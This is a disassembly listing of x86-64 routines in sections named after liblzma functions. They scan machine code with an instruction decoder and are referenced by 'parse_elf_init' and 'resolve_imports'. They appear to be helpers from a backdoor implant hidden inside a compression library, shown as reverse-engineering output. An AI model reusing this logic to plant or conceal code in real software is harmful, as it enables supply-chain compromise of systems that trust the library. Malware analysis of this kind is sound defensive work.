.text.lzma_optimum_normaa:0000000000000CD2                                         ; _Llzma_optimum_normal_0+90↓j
.text.lzma_optimum_normaa:0000000000000CD2                 cmp     rbp, r12
.text.lzma_optimum_normaa:0000000000000CD5                 jnb     short loc_CB4
.text.lzma_optimum_normaa:0000000000000CD7                 mov     rdx, r12
.text.lzma_optimum_normaa:0000000000000CDA                 mov     rsi, rbp
.text.lzma_optimum_normaa:0000000000000CDD                 mov     rdi, rbx
.text.lzma_optimum_normaa:0000000000000CE0                 call    code_dasm       ; PIC mode
.text.lzma_optimum_normaa:0000000000000CE5                 test    eax, eax
.text.lzma_optimum_normaa:0000000000000CE7                 jz      short loc_D0D
.text.lzma_optimum_normaa:0000000000000CE9                 cmp     dword ptr [rbx+28h], 168h
.text.lzma_optimum_normaa:0000000000000CF0                 jnz     short loc_D07
.text.lzma_optimum_normaa:0000000000000CF2                 test    r13, r13
.text.lzma_optimum_normaa:0000000000000CF5                 jz      short loc_D12
.text.lzma_optimum_normaa:0000000000000CF7                 mov     rax, [rbx+8]
.text.lzma_optimum_normaa:0000000000000CFB                 add     rax, [rbx+38h]
.text.lzma_optimum_normaa:0000000000000CFF                 add     rax, [rbx]
.text.lzma_optimum_normaa:0000000000000D02                 cmp     rax, r13
.text.lzma_optimum_normaa:0000000000000D05                 jz      short loc_D12
.text.lzma_optimum_normaa:0000000000000D07
.text.lzma_optimum_normaa:0000000000000D07 loc_D07:                                ; CODE XREF: _Llzma_optimum_normal_0+70↑j
.text.lzma_optimum_normaa:0000000000000D07                 add     rbp, [rbx+8]
.text.lzma_optimum_normaa:0000000000000D0B                 jmp     short loc_CD2
.text.lzma_optimum_normaa:0000000000000D0D ; ---------------------------------------------------------------------------
.text.lzma_optimum_normaa:0000000000000D0D
.text.lzma_optimum_normaa:0000000000000D0D loc_D0D:                                ; CODE XREF: _Llzma_optimum_normal_0+67↑j
.text.lzma_optimum_normaa:0000000000000D0D                 inc     rbp
.text.lzma_optimum_normaa:0000000000000D10                 jmp     short loc_CD2
.text.lzma_optimum_normaa:0000000000000D12 ; ---------------------------------------------------------------------------
.text.lzma_optimum_normaa:0000000000000D12
.text.lzma_optimum_normaa:0000000000000D12 loc_D12:                                ; CODE XREF: _Llzma_optimum_normal_0+75↑j
.text.lzma_optimum_normaa:0000000000000D12                                         ; _Llzma_optimum_normal_0+85↑j
.text.lzma_optimum_normaa:0000000000000D12                 mov     eax, 1
.text.lzma_optimum_normaa:0000000000000D17
.text.lzma_optimum_normaa:0000000000000D17 loc_D17:                                ; CODE XREF: _Llzma_optimum_normal_0+36↑j
.text.lzma_optimum_normaa:0000000000000D17                 add     rsp, 68h
.text.lzma_optimum_normaa:0000000000000D1B                 pop     rbx
.text.lzma_optimum_normaa:0000000000000D1C                 pop     rbp
.text.lzma_optimum_normaa:0000000000000D1D                 pop     r12
.text.lzma_optimum_normaa:0000000000000D1F                 pop     r13
.text.lzma_optimum_normaa:0000000000000D21                 retn
.text.lzma_optimum_normaa:0000000000000D21 _Llzma_optimum_normal_0 endp
.text.lzma_optimum_normaa:0000000000000D21
.text.lzma_optimum_normaa:0000000000000D21 _text_lzma_optimum_normaa ends
.text.lzma_optimum_normaa:0000000000000D21
.text.lzma_filters_updata:0000000000000D30 ; ===========================================================================
.text.lzma_filters_updata:0000000000000D30
.text.lzma_filters_updata:0000000000000D30 ; Segment type: Pure code
.text.lzma_filters_updata:0000000000000D30 ; Segment permissions: Read/Execute
.text.lzma_filters_updata:0000000000000D30 _text_lzma_filters_updata segment para public 'CODE' use64
.text.lzma_filters_updata:0000000000000D30                 assume cs:_text_lzma_filters_updata
.text.lzma_filters_updata:0000000000000D30                 ;org 0D30h
.text.lzma_filters_updata:0000000000000D30                 assume es:nothing, ss:nothing, ds:_text, fs:nothing, gs:nothing
.text.lzma_filters_updata:0000000000000D30
.text.lzma_filters_updata:0000000000000D30 ; =============== S U B R O U T I N E =======================================
.text.lzma_filters_updata:0000000000000D30
.text.lzma_filters_updata:0000000000000D30
.text.lzma_filters_updata:0000000000000D30 ; __int64 __fastcall Llzma_filters_update_0(unsigned __int64, unsigned __int64, int, int, char *)
.text.lzma_filters_updata:0000000000000D30 _Llzma_filters_update_0 proc near       ; CODE XREF: sub_2FE0+65↓p
.text.lzma_filters_updata:0000000000000D30
.text.lzma_filters_updata:0000000000000D30 var_80          = byte ptr -80h
.text.lzma_filters_updata:0000000000000D30
.text.lzma_filters_updata:0000000000000D30                 endbr64
.text.lzma_filters_updata:0000000000000D34                 push    r14
.text.lzma_filters_updata:0000000000000D36                 xor     eax, eax
.text.lzma_filters_updata:0000000000000D38                 mov     r14d, edx
.text.lzma_filters_updata:0000000000000D3B                 push    r13
.text.lzma_filters_updata:0000000000000D3D                 mov     r13d, ecx
.text.lzma_filters_updata:0000000000000D40                 mov     ecx, 16h
.text.lzma_filters_updata:0000000000000D45                 push    r12
.text.lzma_filters_updata:0000000000000D47                 mov     r12, rsi
.text.lzma_filters_updata:0000000000000D4A                 push    rbp
.text.lzma_filters_updata:0000000000000D4B                 mov     rbp, r8
.text.lzma_filters_updata:0000000000000D4E                 push    rbx
.text.lzma_filters_updata:0000000000000D4F                 mov     rbx, rdi
.text.lzma_filters_updata:0000000000000D52                 sub     rsp, 60h
.text.lzma_filters_updata:0000000000000D56                 test    r8, r8
.text.lzma_filters_updata:0000000000000D59                 lea     rdi, [rsp+88h+var_80]
.text.lzma_filters_updata:0000000000000D5E                 rep stosd
.text.lzma_filters_updata:0000000000000D60                 lea     rax, [rsp+88h+var_80]
.text.lzma_filters_updata:0000000000000D65                 cmovz   rbp, rax
.text.lzma_filters_updata:0000000000000D69
.text.lzma_filters_updata:0000000000000D69 loc_D69:                                ; CODE XREF: _Llzma_filters_update_0+98↓j
.text.lzma_filters_updata:0000000000000D69                                         ; _Llzma_filters_update_0+9D↓j
.text.lzma_filters_updata:0000000000000D69                 cmp     rbx, r12
.text.lzma_filters_updata:0000000000000D6C                 jnb     short loc_DCF
.text.lzma_filters_updata:0000000000000D6E                 mov     rdx, r12
.text.lzma_filters_updata:0000000000000D71                 mov     rsi, rbx
.text.lzma_filters_updata:0000000000000D74                 mov     rdi, rbp
.text.lzma_filters_updata:0000000000000D77                 call    code_dasm       ; PIC mode
.text.lzma_filters_updata:0000000000000D7C                 test    eax, eax
.text.lzma_filters_updata:0000000000000D7E                 jz      short loc_DCA
.text.lzma_filters_updata:0000000000000D80                 mov     eax, [rbp+1Ch]
.text.lzma_filters_updata:0000000000000D83                 and     eax, 0FF00FF00h
.text.lzma_filters_updata:0000000000000D88                 cmp     eax, 5000000h
.text.lzma_filters_updata:0000000000000D8D                 jnz     short loc_DC4
.text.lzma_filters_updata:0000000000000D8F                 mov     al, [rbp+1Bh]
.text.lzma_filters_updata:0000000000000D92                 and     eax, 48h
.text.lzma_filters_updata:0000000000000D95                 cmp     al, 48h ; 'H'
.text.lzma_filters_updata:0000000000000D97                 setz    al
.text.lzma_filters_updata:0000000000000D9A                 movzx   eax, al
.text.lzma_filters_updata:0000000000000D9D                 cmp     eax, r14d
.text.lzma_filters_updata:0000000000000DA0                 jz      short loc_DA7
.text.lzma_filters_updata:0000000000000DA2                 test    r13d, r13d
.text.lzma_filters_updata:0000000000000DA5                 jnz     short loc_DC4
.text.lzma_filters_updata:0000000000000DA7
.text.lzma_filters_updata:0000000000000DA7 loc_DA7:                                ; CODE XREF: _Llzma_filters_update_0+70↑j
.text.lzma_filters_updata:0000000000000DA7                 mov     eax, [rbp+28h]
.text.lzma_filters_updata:0000000000000DAA                 cmp     eax, 10Dh
.text.lzma_filters_updata:0000000000000DAF                 jz      short loc_DD3
.text.lzma_filters_updata:0000000000000DB1                 test    r13d, r13d
.text.lzma_filters_updata:0000000000000DB4                 jz      short loc_DBD
.text.lzma_filters_updata:0000000000000DB6                 cmp     eax, 10Bh
.text.lzma_filters_updata:0000000000000DBB                 jmp     short loc_DC2
.text.lzma_filters_updata:0000000000000DBD ; ---------------------------------------------------------------------------
.text.lzma_filters_updata:0000000000000DBD
.text.lzma_filters_updata:0000000000000DBD loc_DBD:                                ; CODE XREF: _Llzma_filters_update_0+84↑j
.text.lzma_filters_updata:0000000000000DBD                 cmp     eax, 109h
.text.lzma_filters_updata:0000000000000DC2
.text.lzma_filters_updata:0000000000000DC2 loc_DC2:                                ; CODE XREF: _Llzma_filters_update_0+8B↑j
.text.lzma_filters_updata:0000000000000DC2                 jz      short loc_DD3
.text.lzma_filters_updata:0000000000000DC4
.text.lzma_filters_updata:0000000000000DC4 loc_DC4:                                ; CODE XREF: _Llzma_filters_update_0+5D↑j
.text.lzma_filters_updata:0000000000000DC4                                         ; _Llzma_filters_update_0+75↑j
.text.lzma_filters_updata:0000000000000DC4                 add     rbx, [rbp+8]
.text.lzma_filters_updata:0000000000000DC8                 jmp     short loc_D69
.text.lzma_filters_updata:0000000000000DCA ; ---------------------------------------------------------------------------
.text.lzma_filters_updata:0000000000000DCA
.text.lzma_filters_updata:0000000000000DCA loc_DCA:                                ; CODE XREF: _Llzma_filters_update_0+4E↑j
.text.lzma_filters_updata:0000000000000DCA                 inc     rbx
.text.lzma_filters_updata:0000000000000DCD                 jmp     short loc_D69
.text.lzma_filters_updata:0000000000000DCF ; ---------------------------------------------------------------------------
.text.lzma_filters_updata:0000000000000DCF
.text.lzma_filters_updata:0000000000000DCF loc_DCF:                                ; CODE XREF: _Llzma_filters_update_0+3C↑j
.text.lzma_filters_updata:0000000000000DCF                 xor     eax, eax
.text.lzma_filters_updata:0000000000000DD1                 jmp     short loc_DD8
.text.lzma_filters_updata:0000000000000DD3 ; ---------------------------------------------------------------------------
.text.lzma_filters_updata:0000000000000DD3
.text.lzma_filters_updata:0000000000000DD3 loc_DD3:                                ; CODE XREF: _Llzma_filters_update_0+7F↑j
.text.lzma_filters_updata:0000000000000DD3                                         ; _Llzma_filters_update_0:loc_DC2↑j
.text.lzma_filters_updata:0000000000000DD3                 mov     eax, 1
.text.lzma_filters_updata:0000000000000DD8
.text.lzma_filters_updata:0000000000000DD8 loc_DD8:                                ; CODE XREF: _Llzma_filters_update_0+A1↑j
.text.lzma_filters_updata:0000000000000DD8                 add     rsp, 60h
.text.lzma_filters_updata:0000000000000DDC                 pop     rbx
.text.lzma_filters_updata:0000000000000DDD                 pop     rbp
.text.lzma_filters_updata:0000000000000DDE                 pop     r12
.text.lzma_filters_updata:0000000000000DE0                 pop     r13
.text.lzma_filters_updata:0000000000000DE2                 pop     r14
.text.lzma_filters_updata:0000000000000DE4                 retn
.text.lzma_filters_updata:0000000000000DE4 _Llzma_filters_update_0 endp
.text.lzma_filters_updata:0000000000000DE4
.text.lzma_filters_updata:0000000000000DE4 ; ---------------------------------------------------------------------------
.text.lzma_filters_updata:0000000000000DE5                 align 10h
.text.lzma_filters_updata:0000000000000DF0
.text.lzma_filters_updata:0000000000000DF0 ; =============== S U B R O U T I N E =======================================
.text.lzma_filters_updata:0000000000000DF0
.text.lzma_filters_updata:0000000000000DF0
.text.lzma_filters_updata:0000000000000DF0 ; __int64 __fastcall Llzma_filters_update_1(unsigned __int64, unsigned __int64, int, int, char *)
.text.lzma_filters_updata:0000000000000DF0 _Llzma_filters_update_1 proc near       ; CODE XREF: parse_elf_init+1068↓p
.text.lzma_filters_updata:0000000000000DF0
.text.lzma_filters_updata:0000000000000DF0 var_80          = byte ptr -80h
.text.lzma_filters_updata:0000000000000DF0
.text.lzma_filters_updata:0000000000000DF0                 endbr64
.text.lzma_filters_updata:0000000000000DF4                 push    r14
.text.lzma_filters_updata:0000000000000DF6                 xor     eax, eax
.text.lzma_filters_updata:0000000000000DF8                 mov     r14d, edx
.text.lzma_filters_updata:0000000000000DFB                 push    r13
.text.lzma_filters_updata:0000000000000DFD                 mov     r13d, ecx
.text.lzma_filters_updata:0000000000000E00                 mov     ecx, 16h
.text.lzma_filters_updata:0000000000000E05                 push    r12
.text.lzma_filters_updata:0000000000000E07                 mov     r12, rsi
.text.lzma_filters_updata:0000000000000E0A                 push    rbp
.text.lzma_filters_updata:0000000000000E0B                 mov     rbp, r8
.text.lzma_filters_updata:0000000000000E0E                 push    rbx
.text.lzma_filters_updata:0000000000000E0F                 mov     rbx, rdi
.text.lzma_filters_updata:0000000000000E12                 sub     rsp, 60h
.text.lzma_filters_updata:0000000000000E16                 test    r8, r8
.text.lzma_filters_updata:0000000000000E19                 lea     rdi, [rsp+88h+var_80]
.text.lzma_filters_updata:0000000000000E1E                 rep stosd
.text.lzma_filters_updata:0000000000000E20                 lea     rax, [rsp+88h+var_80]
.text.lzma_filters_updata:0000000000000E25                 cmovz   rbp, rax
.text.lzma_filters_updata:0000000000000E29
.text.lzma_filters_updata:0000000000000E29 loc_E29:                                ; CODE XREF: _Llzma_filters_update_1+91↓j
.text.lzma_filters_updata:0000000000000E29                                         ; _Llzma_filters_update_1+96↓j
.text.lzma_filters_updata:0000000000000E29                 cmp     rbx, r12
.text.lzma_filters_updata:0000000000000E2C                 jnb     short loc_E88
.text.lzma_filters_updata:0000000000000E2E                 mov     rdx, r12
.text.lzma_filters_updata:0000000000000E31                 mov     rsi, rbx
.text.lzma_filters_updata:0000000000000E34                 mov     rdi, rbp
.text.lzma_filters_updata:0000000000000E37                 call    code_dasm       ; PIC mode
.text.lzma_filters_updata:0000000000000E3C                 test    eax, eax
.text.lzma_filters_updata:0000000000000E3E                 jz      short loc_E83
.text.lzma_filters_updata:0000000000000E40                 mov     eax, [rbp+1Ch]
.text.lzma_filters_updata:0000000000000E43                 and     eax, 0FF00FF00h
.text.lzma_filters_updata:0000000000000E48                 cmp     eax, 5000000h
.text.lzma_filters_updata:0000000000000E4D                 jnz     short loc_E7D
.text.lzma_filters_updata:0000000000000E4F                 mov     al, [rbp+1Bh]
.text.lzma_filters_updata:0000000000000E52                 and     eax, 48h
.text.lzma_filters_updata:0000000000000E55                 cmp     al, 48h ; 'H'
.text.lzma_filters_updata:0000000000000E57                 setz    al
.text.lzma_filters_updata:0000000000000E5A                 movzx   eax, al
.text.lzma_filters_updata:0000000000000E5D                 cmp     eax, r14d
.text.lzma_filters_updata:0000000000000E60                 jz      short loc_E67
.text.lzma_filters_updata:0000000000000E62                 test    r13d, r13d
.text.lzma_filters_updata:0000000000000E65                 jnz     short loc_E7D
.text.lzma_filters_updata:0000000000000E67
.text.lzma_filters_updata:0000000000000E67 loc_E67:                                ; CODE XREF: _Llzma_filters_update_1+70↑j
.text.lzma_filters_updata:0000000000000E67                 mov     eax, [rbp+28h]
.text.lzma_filters_updata:0000000000000E6A                 test    r13d, r13d
.text.lzma_filters_updata:0000000000000E6D                 jz      short loc_E76
.text.lzma_filters_updata:0000000000000E6F                 cmp     eax, 10Bh
.text.lzma_filters_updata:0000000000000E74                 jmp     short loc_E7B
.text.lzma_filters_updata:0000000000000E76 ; ---------------------------------------------------------------------------
.text.lzma_filters_updata:0000000000000E76
.text.lzma_filters_updata:0000000000000E76 loc_E76:                                ; CODE XREF: _Llzma_filters_update_1+7D↑j
.text.lzma_filters_updata:0000000000000E76                 cmp     eax, 109h
.text.lzma_filters_updata:0000000000000E7B
.text.lzma_filters_updata:0000000000000E7B loc_E7B:                                ; CODE XREF: _Llzma_filters_update_1+84↑j
.text.lzma_filters_updata:0000000000000E7B                 jz      short loc_E8C
.text.lzma_filters_updata:0000000000000E7D
.text.lzma_filters_updata:0000000000000E7D loc_E7D:                                ; CODE XREF: _Llzma_filters_update_1+5D↑j
.text.lzma_filters_updata:0000000000000E7D                                         ; _Llzma_filters_update_1+75↑j
.text.lzma_filters_updata:0000000000000E7D                 add     rbx, [rbp+8]
.text.lzma_filters_updata:0000000000000E81                 jmp     short loc_E29
.text.lzma_filters_updata:0000000000000E83 ; ---------------------------------------------------------------------------
.text.lzma_filters_updata:0000000000000E83
.text.lzma_filters_updata:0000000000000E83 loc_E83:                                ; CODE XREF: _Llzma_filters_update_1+4E↑j
.text.lzma_filters_updata:0000000000000E83                 inc     rbx
.text.lzma_filters_updata:0000000000000E86                 jmp     short loc_E29
.text.lzma_filters_updata:0000000000000E88 ; ---------------------------------------------------------------------------
.text.lzma_filters_updata:0000000000000E88
.text.lzma_filters_updata:0000000000000E88 loc_E88:                                ; CODE XREF: _Llzma_filters_update_1+3C↑j
.text.lzma_filters_updata:0000000000000E88                 xor     eax, eax
.text.lzma_filters_updata:0000000000000E8A                 jmp     short loc_E91
.text.lzma_filters_updata:0000000000000E8C ; ---------------------------------------------------------------------------
.text.lzma_filters_updata:0000000000000E8C
.text.lzma_filters_updata:0000000000000E8C loc_E8C:                                ; CODE XREF: _Llzma_filters_update_1:loc_E7B↑j
.text.lzma_filters_updata:0000000000000E8C                 mov     eax, 1
.text.lzma_filters_updata:0000000000000E91
.text.lzma_filters_updata:0000000000000E91 loc_E91:                                ; CODE XREF: _Llzma_filters_update_1+9A↑j
.text.lzma_filters_updata:0000000000000E91                 add     rsp, 60h
.text.lzma_filters_updata:0000000000000E95                 pop     rbx
.text.lzma_filters_updata:0000000000000E96                 pop     rbp
.text.lzma_filters_updata:0000000000000E97                 pop     r12
.text.lzma_filters_updata:0000000000000E99                 pop     r13
.text.lzma_filters_updata:0000000000000E9B                 pop     r14
.text.lzma_filters_updata:0000000000000E9D                 retn
.text.lzma_filters_updata:0000000000000E9D _Llzma_filters_update_1 endp
.text.lzma_filters_updata:0000000000000E9D
.text.lzma_filters_updata:0000000000000E9D _text_lzma_filters_updata ends
.text.lzma_filters_updata:0000000000000E9D
.text.lzma_raw_encodea:0000000000000EA0 ; ===========================================================================
.text.lzma_raw_encodea:0000000000000EA0
.text.lzma_raw_encodea:0000000000000EA0 ; Segment type: Pure code
.text.lzma_raw_encodea:0000000000000EA0 ; Segment permissions: Read/Execute
.text.lzma_raw_encodea:0000000000000EA0 _text_lzma_raw_encodea segment para public 'CODE' use64
.text.lzma_raw_encodea:0000000000000EA0                 assume cs:_text_lzma_raw_encodea
.text.lzma_raw_encodea:0000000000000EA0                 ;org 0EA0h
.text.lzma_raw_encodea:0000000000000EA0                 assume es:nothing, ss:nothing, ds:_text, fs:nothing, gs:nothing
.text.lzma_raw_encodea:0000000000000EA0
.text.lzma_raw_encodea:0000000000000EA0 ; =============== S U B R O U T I N E =======================================
.text.lzma_raw_encodea:0000000000000EA0
.text.lzma_raw_encodea:0000000000000EA0
.text.lzma_raw_encodea:0000000000000EA0 ; __int64 __fastcall Llzma_raw_encoder_0(unsigned __int64, unsigned __int64, __int64)
.text.lzma_raw_encodea:0000000000000EA0 _Llzma_raw_encoder_0 proc near          ; CODE XREF: resolve_imports+244↓p
.text.lzma_raw_encodea:0000000000000EA0                                         ; resolve_imports+26A↓p
.text.lzma_raw_encodea:0000000000000EA0
.text.lzma_raw_encodea:0000000000000EA0 var_80          = dword ptr -80h
.text.lzma_raw_encodea:0000000000000EA0 var_6F          = byte ptr -6Fh
.text.lzma_raw_encodea:0000000000000EA0 var_58          = dword ptr -58h
.text.lzma_raw_encodea:0000000000000EA0 var_50          = qword ptr -50h
.text.lzma_raw_encodea:0000000000000EA0
.text.lzma_raw_encodea:0000000000000EA0                 endbr64
.text.lzma_raw_encodea:0000000000000EA4                 push    r14
.text.lzma_raw_encodea:0000000000000EA6                 xor     ecx, ecx
.text.lzma_raw_encodea:0000000000000EA8                 push    r13
.text.lzma_raw_encodea:0000000000000EAA                 push    r12
.text.lzma_raw_encodea:0000000000000EAC                 mov     r12, rdx
.text.lzma_raw_encodea:0000000000000EAF                 mov     edx, 6
.text.lzma_raw_encodea:0000000000000EB4                 push    rbp
.text.lzma_raw_encodea:0000000000000EB5                 mov     rbp, rsi
.text.lzma_raw_encodea:0000000000000EB8                 mov     esi, 5
.text.lzma_raw_encodea:0000000000000EBD                 push    rbx
.text.lzma_raw_encodea:0000000000000EBE                 mov     rbx, rdi
.text.lzma_raw_encodea:0000000000000EC1                 mov     edi, 7Ch ; '|'
.text.lzma_raw_encodea:0000000000000EC6                 sub     rsp, 60h
.text.lzma_raw_encodea:0000000000000ECA                 call    _Llzma_index_iter_rewind_cold ; PIC mode
.text.lzma_raw_encodea:0000000000000ECF                 test    eax, eax
.text.lzma_raw_encodea:0000000000000ED1                 jnz     short loc_ED7
.text.lzma_raw_encodea:0000000000000ED3
.text.lzma_raw_encodea:0000000000000ED3 loc_ED3:                                ; CODE XREF: _Llzma_raw_encoder_0+53↓j
.text.lzma_raw_encodea:0000000000000ED3                 xor     eax, eax
.text.lzma_raw_encodea:0000000000000ED5                 jmp     short loc_F35
.text.lzma_raw_encodea:0000000000000ED7 ; ---------------------------------------------------------------------------
.text.lzma_raw_encodea:0000000000000ED7
.text.lzma_raw_encodea:0000000000000ED7 loc_ED7:                                ; CODE XREF: _Llzma_raw_encoder_0+31↑j
.text.lzma_raw_encodea:0000000000000ED7                 lea     rdi, [rsp+88h+var_80]
.text.lzma_raw_encodea:0000000000000EDC                 mov     ecx, 16h
.text.lzma_raw_encodea:0000000000000EE1                 xor     eax, eax
.text.lzma_raw_encodea:0000000000000EE3                 mov     r14, r12
.text.lzma_raw_encodea:0000000000000EE6                 rep stosd
.text.lzma_raw_encodea:0000000000000EE8                 lea     r13, [rsp+88h+var_80]
.text.lzma_raw_encodea:0000000000000EED                 neg     r14
.text.lzma_raw_encodea:0000000000000EF0
.text.lzma_raw_encodea:0000000000000EF0 loc_EF0:                                ; CODE XREF: _Llzma_raw_encoder_0+8E↓j
.text.lzma_raw_encodea:0000000000000EF0                 cmp     rbx, rbp
.text.lzma_raw_encodea:0000000000000EF3                 jnb     short loc_ED3
.text.lzma_raw_encodea:0000000000000EF5                 mov     rdx, rbp
.text.lzma_raw_encodea:0000000000000EF8                 mov     rsi, rbx
.text.lzma_raw_encodea:0000000000000EFB                 mov     rdi, r13
.text.lzma_raw_encodea:0000000000000EFE                 call    code_dasm       ; PIC mode
.text.lzma_raw_encodea:0000000000000F03                 test    eax, eax
.text.lzma_raw_encodea:0000000000000F05                 jz      short loc_F2B
.text.lzma_raw_encodea:0000000000000F07                 cmp     [rsp+88h+var_58], 10Dh
.text.lzma_raw_encodea:0000000000000F0F                 jnz     short loc_F2B
.text.lzma_raw_encodea:0000000000000F11                 mov     al, [rsp+88h+var_6F]
.text.lzma_raw_encodea:0000000000000F15                 and     eax, 7
.text.lzma_raw_encodea:0000000000000F18                 dec     al
.text.lzma_raw_encodea:0000000000000F1A                 jnz     short loc_F2B
.text.lzma_raw_encodea:0000000000000F1C                 mov     rax, [rsp+88h+var_50]
.text.lzma_raw_encodea:0000000000000F21                 cmp     rax, r12
.text.lzma_raw_encodea:0000000000000F24                 jz      short loc_F30
.text.lzma_raw_encodea:0000000000000F26                 cmp     rax, r14
.text.lzma_raw_encodea:0000000000000F29                 jz      short loc_F30
.text.lzma_raw_encodea:0000000000000F2B
.text.lzma_raw_encodea:0000000000000F2B loc_F2B:                                ; CODE XREF: _Llzma_raw_encoder_0+65↑j
.text.lzma_raw_encodea:0000000000000F2B                                         ; _Llzma_raw_encoder_0+6F↑j ...
.text.lzma_raw_encodea:0000000000000F2B                 inc     rbx
.text.lzma_raw_encodea:0000000000000F2E                 jmp     short loc_EF0
.text.lzma_raw_encodea:0000000000000F30 ; ---------------------------------------------------------------------------
.text.lzma_raw_encodea:0000000000000F30
.text.lzma_raw_encodea:0000000000000F30 loc_F30:                                ; CODE XREF: _Llzma_raw_encoder_0+84↑j
.text.lzma_raw_encodea:0000000000000F30                                         ; _Llzma_raw_encoder_0+89↑j
.text.lzma_raw_encodea:0000000000000F30                 mov     eax, 1
.text.lzma_raw_encodea:0000000000000F35
.text.lzma_raw_encodea:0000000000000F35 loc_F35:                                ; CODE XREF: _Llzma_raw_encoder_0+35↑j
.text.lzma_raw_encodea:0000000000000F35                 add     rsp, 60h
.text.lzma_raw_encodea:0000000000000F39                 pop     rbx
.text.lzma_raw_encodea:0000000000000F3A                 pop     rbp
.text.lzma_raw_encodea:0000000000000F3B                 pop     r12
.text.lzma_raw_encodea:0000000000000F3D                 pop     r13
.text.lzma_raw_encodea:0000000000000F3F                 pop     r14
.text.lzma_raw_encodea:0000000000000F41                 retn
.text.lzma_raw_encodea:0000000000000F41 _Llzma_raw_encoder_0 endp
.text.lzma_raw_encodea:0000000000000F41
.text.lzma_raw_encodea:0000000000000F41 _text_lzma_raw_encodea ends
.text.lzma_raw_encodea:0000000000000F41
.text.lzma_mt_block_siza:0000000000000F50 ; ===========================================================================
.text.lzma_mt_block_siza:0000000000000F50
.text.lzma_mt_block_siza:0000000000000F50 ; Segment type: Pure code
.text.lzma_mt_block_siza:0000000000000F50 ; Segment permissions: Read/Execute
.text.lzma_mt_block_siza:0000000000000F50 _text_lzma_mt_block_siza segment para public 'CODE' use64
.text.lzma_mt_block_siza:0000000000000F50                 assume cs:_text_lzma_mt_block_siza
.text.lzma_mt_block_siza:0000000000000F50                 ;org 0F50h
.text.lzma_mt_block_siza:0000000000000F50                 assume es:nothing, ss:nothing, ds:_text, fs:nothing, gs:nothing
.text.lzma_mt_block_siza:0000000000000F50
.text.lzma_mt_block_siza:0000000000000F50 ; =============== S U B R O U T I N E =======================================
.text.lzma_mt_block_siza:0000000000000F50
.text.lzma_mt_block_siza:0000000000000F50
.text.lzma_mt_block_siza:0000000000000F50 ; __int64 __fastcall Llzma_mt_block_size_1(unsigned __int64, unsigned __int64, char *, __int64)
.text.lzma_mt_block_siza:0000000000000F50 _Llzma_mt_block_size_1 proc near        ; CODE XREF: _Lstream_encode_1+27↓p
.text.lzma_mt_block_siza:0000000000000F50                                         ; _Lstream_encoder_mt_init_1+1B↓p ...
.text.lzma_mt_block_siza:0000000000000F50
.text.lzma_mt_block_siza:0000000000000F50 var_80          = byte ptr -80h
.text.lzma_mt_block_siza:0000000000000F50
.text.lzma_mt_block_siza:0000000000000F50                 endbr64
.text.lzma_mt_block_siza:0000000000000F54                 push    r13
.text.lzma_mt_block_siza:0000000000000F56                 mov     r13, rcx
.text.lzma_mt_block_siza:0000000000000F59                 xor     ecx, ecx
.text.lzma_mt_block_siza:0000000000000F5B                 push    r12
.text.lzma_mt_block_siza:0000000000000F5D                 mov     r12, rsi
.text.lzma_mt_block_siza:0000000000000F60                 xor     esi, esi
.text.lzma_mt_block_siza:0000000000000F62                 push    rbp
.text.lzma_mt_block_siza:0000000000000F63                 mov     rbp, rdi
.text.lzma_mt_block_siza:0000000000000F66                 mov     edi, 1C8h
.text.lzma_mt_block_siza:0000000000000F6B                 push    rbx
.text.lzma_mt_block_siza:0000000000000F6C                 mov     rbx, rdx
.text.lzma_mt_block_siza:0000000000000F6F                 mov     edx, 1Eh
.text.lzma_mt_block_siza:0000000000000F74                 sub     rsp, 68h
.text.lzma_mt_block_siza:0000000000000F78                 call    _Llzma_index_iter_rewind_cold ; PIC mode
.text.lzma_mt_block_siza:0000000000000F7D                 test    eax, eax
.text.lzma_mt_block_siza:0000000000000F7F                 jnz     short loc_F85
.text.lzma_mt_block_siza:0000000000000F81
.text.lzma_mt_block_siza:0000000000000F81 loc_F81:                                ; CODE XREF: _Llzma_mt_block_size_1+52↓j
.text.lzma_mt_block_siza:0000000000000F81                 xor     eax, eax
.text.lzma_mt_block_siza:0000000000000F83                 jmp     short loc_FF7
.text.lzma_mt_block_siza:0000000000000F85 ; ---------------------------------------------------------------------------
.text.lzma_mt_block_siza:0000000000000F85
.text.lzma_mt_block_siza:0000000000000F85 loc_F85:                                ; CODE XREF: _Llzma_mt_block_size_1+2F↑j
.text.lzma_mt_block_siza:0000000000000F85                 xor     eax, eax
.text.lzma_mt_block_siza:0000000000000F87                 lea     rdi, [rsp+88h+var_80]
.text.lzma_mt_block_siza:0000000000000F8C                 mov     ecx, 16h
.text.lzma_mt_block_siza:0000000000000F91                 test    rbx, rbx
.text.lzma_mt_block_siza:0000000000000F94                 rep stosd
.text.lzma_mt_block_siza:0000000000000F96                 lea     rax, [rsp+88h+var_80]
.text.lzma_mt_block_siza:0000000000000F9B                 cmovz   rbx, rax
.text.lzma_mt_block_siza:0000000000000F9F
.text.lzma_mt_block_siza:0000000000000F9F loc_F9F:                                ; CODE XREF: _Llzma_mt_block_size_1+A0↓j
.text.lzma_mt_block_siza:0000000000000F9F                 cmp     rbp, r12
.text.lzma_mt_block_siza:0000000000000FA2                 jnb     short loc_F81
.text.lzma_mt_block_siza:0000000000000FA4                 mov     rdx, r12
.text.lzma_mt_block_siza:0000000000000FA7                 mov     rsi, rbp
.text.lzma_mt_block_siza:0000000000000FAA                 mov     rdi, rbx
.text.lzma_mt_block_siza:0000000000000FAD                 call    code_dasm       ; PIC mode
.text.lzma_mt_block_siza:0000000000000FB2                 test    eax, eax
.text.lzma_mt_block_siza:0000000000000FB4                 jz      short loc_FED
.text.lzma_mt_block_siza:0000000000000FB6                 cmp     dword ptr [rbx+28h], 10Dh
.text.lzma_mt_block_siza:0000000000000FBD                 jnz     short loc_FED
.text.lzma_mt_block_siza:0000000000000FBF                 mov     al, [rbx+1Bh]
.text.lzma_mt_block_siza:0000000000000FC2                 and     eax, 48h
.text.lzma_mt_block_siza:0000000000000FC5                 cmp     al, 48h ; 'H'
.text.lzma_mt_block_siza:0000000000000FC7                 jnz     short loc_FED
.text.lzma_mt_block_siza:0000000000000FC9                 mov     eax, [rbx+1Ch]
.text.lzma_mt_block_siza:0000000000000FCC                 and     eax, 0FF00FF00h
.text.lzma_mt_block_siza:0000000000000FD1                 cmp     eax, 5000000h
.text.lzma_mt_block_siza:0000000000000FD6                 jnz     short loc_FED
.text.lzma_mt_block_siza:0000000000000FD8                 test    r13, r13
.text.lzma_mt_block_siza:0000000000000FDB                 jz      short loc_FF2
.text.lzma_mt_block_siza:0000000000000FDD                 mov     rax, [rbx+8]
